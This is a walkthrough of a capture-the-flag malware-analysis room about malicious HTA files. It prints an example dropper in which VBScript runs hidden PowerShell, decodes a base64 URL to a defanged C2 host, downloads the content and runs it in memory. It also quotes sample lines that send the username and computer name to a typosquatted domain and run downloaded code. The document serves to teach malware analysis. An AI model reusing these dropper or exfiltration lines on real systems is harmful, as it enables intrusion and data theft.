## Walkthrough of Day 21 - Malware Analysis - Malhare.exe 



## Theory - What will we learn?
* Application metadata
* Script functions
* Clues about exfiltration



### What even are .hta files
* HTML application
* Similar to html,Only diffrence they run on windows os and use OS functions
* they use process called `mshta.exe` Microsoft HTML Application Host 

Used for:
* Building basic GUI for scripts
* Building Install menus
* Banks, Insurance companies and govermants use for building basic applications for workers


### .hta File Structure
1. HTA declaration 
```
<HTA:APPLICATION 
        ID="TBFCApp"
        APPLICATIONNAME="Utility Tool"
        BORDER="thin"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
    />
```
2. Interface(HTML & CSS) - exactly like html pages
3. script -> The main diffrence
 * this sections define what the apllications will do onec interacted with.
 ```
    <input type="button" value="Say Hello" onclick="MsgBox('Hello from Wareville!')">
 ```
##
### Malicous hta 
* Droppers
    * Send via mail using phishing
    * When opend, run VBScript that run PowerShell
    * Powershell downloads the real malware and runs it
* Fileless Attacks
    * HTA code injects to RAM memory, using PowerShell
    * Doesnt create files, harder to detect
* Using `mshta.exe` to pass AntiVirus 
* Creating Backdoor for Persistence
    * .hta files can make Registry changes
    * Malware adds new key to `Run` 
    * Windows will connect on startup to the Attackes server 
* Phishing
    * using html & css attacker can create any website they want
    * Attackers create fake login pages
    * Victims thinking its real website
    * Credentials sent to real website

`EXAMPLE OF MALICOUS CODE`

```html
<html>
  <head>
    <title>Angry King Malhare</title>
    <HTA:APPLICATION ID="Malhare" APPLICATIONNAME="B" BORDER="none" 
     SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
    </HTA:APPLICATION>
    <script language="VBScript">
      Option Explicit:Dim a:Set a=CreateObject("WScript.Shell"):Dim 
      b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command "" 
      {$U=
      [System.Text.Encoding]::UTF8.GetString([System.Convert]::
      FromBase64String('aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0')) 
      $C=(Invoke-WebRequest -Uri 
      $U -UseBasicParsing).Content 
      $B=[scriptblock]::Create($C) $B}""":a.Run 
      b,0,True:self.close
    </script>
  </head>
  <body>
  </body>
</html>
```
* Script is written in `VBScript`
* There is a powershell command that runs in the Background
* The malicous code is encoded in Base64 format
* If we decode it we get --->
```
https://raw.king-malhare[.]com/c2/silver/refs/heads/main/REDACTED.txt
```
* This is a dropper, this .hta downloads a malware from the C2 server of the attacker
* Finaly the .hta script uses the downloded malware and converts it into executable using scriptblock
* Finnaly hta runs the malicous code in memory


### PRACTICAL
Ive added this rooms script in addition to this readme file
* Lets uncover the malware step by step by following the questions



##
## Answers

#### Q:  What is the title of the HTA application?

```
<title>Best Festival Company Developer Survey</title>
```

#### A: `Best Festival Company Developer Survey`

##
#### Q: What VBScript function is acting as if it is downloading the survey questions?

```
Function getQuestions()
		Dim IE, result, decoded, decodedString
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
```

#### A: `getQuestions`


##
#### Q: What URL domain (including sub-domain) is the "questions" being downloaded from?
#### A: `survey.bestfestiivalcompany.com`

#### Q: Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?
* notice in the word festival there is an extra i
#### A: `i`

#### Q:Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?

* look at the html part of the script
```html
<h3>How long have you been employed at Best Festival Company?</h3>								
<h3>Do you feel valued at work?</h3>
<h3>Do you feel content with your current salary?</h3>
<h3>By how much do you believe your salary should increase?</h3>
```
#### A: `4`

#### Q:Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?

```html
<div>
All participants will be entered into a prize draw for a chance to win a trip to the South Pole!
</div>
```
#### A: `South Pole`



#### Q:The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.

```
strHost = CreateObject("WScript.Network").ComputerName
strUser = CreateObject("WScript.Network").UserName
```
#### A: `ComputerName,UserName`

#### Q:What endpoint is the enumerated data being exfiltrated to?

`IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost`
#### A: `/details`

#### Q:What HTTP method is being used to exfiltrate the data?
`?u=" & strUser & "?h=" & strHost`
* sends the data in the url parameters
* meaning this is a GET request

#### A: `GET`

#### Q:After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?
* look for .run

#### A: `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False`


#### Q:It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from here. What popular encoding scheme was used in an attempt to obfuscate the download?

* We get a link to txt file
* i have downloded the txt file 
* Its not readable, its encoded
* i see Upper & Lower case letters with numbers
* lets try to decode using base64
```
cat blob.txt | base64 -d 
```
* Success!! i see the code but there is another encoding

#### A: `base64`


#### Q:Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?

* this is a powershell code that takes encoded flag and moves all the letters 13 spaces to the right
* the PS script adds to the ascii value 13 and converts back to char 
#### A: `rot13`

#### Q:Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?
* lets run the script using tr
```bash
cat script.ps1| grep flag | head -n 1 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
#Output 
$synt = ''

```


#### A: `THM{Malware.Analysed}`


##


## You completed the room!!!